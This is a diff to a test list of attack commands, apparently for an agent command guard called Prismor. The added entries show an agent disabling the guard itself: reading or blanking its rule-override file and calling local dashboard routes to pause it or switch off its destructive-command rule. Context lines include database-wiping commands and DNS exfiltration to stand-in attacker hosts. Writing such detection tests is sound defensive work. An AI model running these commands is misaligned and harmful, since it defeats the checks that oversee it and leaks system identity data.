@@ -85,6 +85,13 @@ ATTACKS = [
     ("prismor-self-edit", "echo x > " + DB),
     ("prismor-self-edit", "cp /dev/null " + DB),
     ("prismor-self-edit", "prismor allow x --off; echo --help"),
+    # Floor rules switched off with the unlock password, and the dashboard routes
+    # that pause Prismor, update it or switch those rules.
+    ("prismor-self-edit", "cat ~/.prismor/floor-off.json"),
+    ("prismor-self-edit", "echo '{}' > ~/.prismor/floor-off.json"),
+    ("prismor-self-edit", "curl -s -X POST localhost:7070/api/pause -d '{\"paused\":true}'"),
+    ("prismor-self-edit", "curl -X POST http://127.0.0.1:7070/api/update"),
+    ("prismor-self-edit", "curl -X POST localhost:7070/api/policy/floor-off -d '{\"rule\":\"destructive-command\"}'"),
     # The normalized command unwraps substitutions; these only match the raw one.
     ("dns-exfiltration", "nslookup `whoami`.evil.example"),
     ("dns-exfiltration", "host $(id -u).attacker.example"),
